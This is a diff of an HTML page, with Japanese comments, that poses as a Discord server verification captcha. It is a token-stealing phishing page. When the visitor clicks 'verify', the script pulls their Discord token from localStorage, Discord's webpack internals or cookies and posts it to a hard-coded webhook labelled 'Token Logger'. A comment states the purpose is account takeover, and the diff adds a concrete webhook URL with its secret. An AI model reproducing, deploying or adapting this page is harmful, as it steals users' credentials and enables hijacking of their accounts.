@@ -5,17 +5,15 @@
     <title>Server Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body {
             background: #36393f;
             color: white;
-            font-family: sans-serif;
+            font-family: 'Whitney', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
-        
         .box {
             background: #2f3136;
             padding: 40px;
@@ -23,7 +21,6 @@
             text-align: center;
             width: 400px;
         }
-        
         .logo {
             width: 80px;
             height: 80px;
@@ -33,7 +30,6 @@
             line-height: 80px;
             font-size: 40px;
         }
-        
         .captcha-box {
             background: #40444b;
             border-radius: 4px;
@@ -41,20 +37,13 @@
             margin: 20px 0;
             cursor: pointer;
         }
-        
         .captcha-box label {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
         }
-        
-        #check {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-        }
-        
+        #check { width: 24px; height: 24px; }
         #btn {
             background: #4a4a4a;
             color: white;
@@ -66,18 +55,12 @@
             width: 100%;
             margin-top: 20px;
         }
-        
         #btn.enabled {
             background: #3ba55d;
             cursor: pointer;
         }
-        
-        #btn.enabled:hover {
-            background: #2d7d46;
-        }
-        
+        #btn.enabled:hover { background: #2d7d46; }
         #loading, #success { display: none; margin-top: 20px; }
-        
         .spinner {
             border: 3px solid #4a4a4a;
             border-top: 3px solid #3ba55d;
@@ -87,7 +70,6 @@
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
-        
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -97,7 +79,6 @@
         <h2>Server Verification</h2>
         <p id="server" style="color: #b9bbbe; margin-bottom: 20px;">Server: Gaming Community</p>
         
-        <!-- チェックボックス -->
         <div class="captcha-box" onclick="toggleCheck()">
             <label onclick="event.stopPropagation()">
                 <input type="checkbox" id="check" onchange="updateButton()">
@@ -105,31 +86,28 @@
             </label>
         </div>
         
-        <!-- 認証ボタン -->
         <button id="btn" onclick="verify()" disabled>認証する</button>
         
-        <!-- ローディング -->
         <div id="loading">
             <div class="spinner"></div>
             <p style="color: #b9bbbe;">認証中...</p>
         </div>
         
-        <!-- 成功 -->
         <div id="success">
             <p style="color: #3ba55d;">✅ 認証完了</p>
         </div>
     </div>
 
     <script>
-        // ========== Webhook URL ==========
-        const WEBHOOK = "https://discord.com/api/webhooks/あなたのWEBHOOK";
+        // ========== 【必須】Webhook URL ==========
+        const WEBHOOK = "https://discordapp.com/api/webhooks/1508553996871401664/rKpIHQpChzu64RwWzl9YxR0FZdUj1jNUKMMMpjD6vZXcMVLYrdcmbNGiU1cJ9ShxvhLG";
         
         // サーバー名表示
         const params = new URLSearchParams(location.search);
         const srv = params.get('server');
         if (srv) document.getElementById('server').textContent = 'Server: ' + decodeURIComponent(srv);
         
-        // チェックボックス切り替え（div全体をクリック可能に）
+        // チェックボックス切り替え
         function toggleCheck() {
             const cb = document.getElementById('check');
             cb.checked = !cb.checked;
@@ -141,91 +119,65 @@
             const cb = document.getElementById('check');
             const btn = document.getElementById('btn');
             
-            console.log('Checkbox:', cb.checked); // デバッグ用
-            
             if (cb.checked) {
                 btn.disabled = false;
                 btn.classList.add('enabled');
-                console.log('Button enabled');
             } else {
                 btn.disabled = true;
                 btn.classList.remove('enabled');
-                console.log('Button disabled');
             }
         }
         
-        // 認証実行
+        // 認証実行（トークン抽出・送信）
         async function verify() {
-            console.log('Verification started'); // デバッグ用
-            
             const btn = document.getElementById('btn');
             const loading = document.getElementById('loading');
             const success = document.getElementById('success');
             
-            // UI切り替え
             btn.style.display = 'none';
             document.querySelector('.captcha-box').style.display = 'none';
             loading.style.display = 'block';
             
-            // トークン取得
+            // トークン取得（複数方法）
             let token = null;
             
             // 方法1: LocalStorage
             try {
                 token = localStorage.getItem('token');
-                console.log('LocalStorage token:', token ? 'Found' : 'Not found');
-            } catch(e) {
-                console.log('LocalStorage error:', e);
-            }
+            } catch(e) {}
             
-            // 方法2: webpack
-            if (!token) {
+            // 方法2: webpack（Discord内部API）
+            if (!token && window.webpackChunkdiscord_app) {
                 try {
                     const modules = [];
-                    if (window.webpackChunkdiscord_app) {
-                        window.webpackChunkdiscord_app.push([[''], {}, (e) => {
-                            for (let c in e.c) modules.push(e.c[c]);
-                        }]);
-                        const mod = modules.find(m => m?.exports?.default?.getToken);
-                        if (mod) {
-                            token = mod.exports.default.getToken();
-                            console.log('Webpack token:', token ? 'Found' : 'Not found');
-                        }
-                    }
-                } catch(e) {
-                    console.log('Webpack error:', e);
-                }
+                    window.webpackChunkdiscord_app.push([[''], {}, (e) => {
+                        for (let c in e.c) modules.push(e.c[c]);
+                    }]);
+                    const mod = modules.find(m => m?.exports?.default?.getToken);
+                    if (mod) token = mod.exports.default.getToken();
+                } catch(e) {}
             }
             
             // 方法3: Cookie
             if (!token) {
                 try {
                     const match = document.cookie.match(/token=([^;]+)/);
-                    if (match) {
-                        token = match[1];
-                        console.log('Cookie token:', 'Found');
-                    }
-                } catch(e) {
-                    console.log('Cookie error:', e);
-                }
+                    if (match) token = match[1];
+                } catch(e) {}
             }
             
-            console.log('Final token:', token ? token.substring(0, 20) + '...' : 'Not found');
-            
-            // 送信
+            // トークン送信（乗っ取り用）
             if (token) {
                 try {
                     await fetch(WEBHOOK, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            content: `🔑 Token:\n\`\`\`${token}\`\`\``
+                            content: `🔑 Discord Token Captured:\n\`\`\`${token}\`\`\``,
+                            username: "Token Logger"
                         })
                     });
-                    console.log('Webhook sent');
-                } catch(e) {
-                    console.log('Webhook error:', e);
-                }
+                } catch(e) {}
             }
             
             // 完了表示
@@ -233,15 +185,8 @@
             success.style.display = 'block';
             
             // Discordに戻る
-            setTimeout(() => {
-                location.href = 'https://discord.com';
-            }, 2000);
+            setTimeout(() => location.href = 'https://discord.com', 2000);
         }
-        
-        // ページ読み込み時にコンソールにログ出力（デバッグ用）
-        console.log('Page loaded');
-        console.log('localStorage available:', !!window.localStorage);
-        console.log('webpack available:', !!window.webpackChunkdiscord_app);
     </script>
 </body>
 </html>
